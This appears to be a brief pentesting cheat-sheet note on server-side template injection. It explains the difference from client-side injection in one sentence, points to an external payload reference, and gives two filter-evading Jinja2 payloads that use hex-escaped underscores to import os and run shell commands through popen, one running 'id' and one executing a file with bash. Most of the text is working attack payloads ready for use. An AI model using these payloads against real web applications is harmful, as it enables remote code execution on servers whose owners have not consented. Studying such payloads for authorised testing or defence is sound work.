The difference between server side and client side template injections is that the former runs the template sintax in the server insted of in the context of the browser, like the latter.

Utilize payload wordlists to try to find the template engine, after having found the template engine search https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection for payloads.

	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

#### Execute file
	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash%20[file directory]')|attr('read')()}}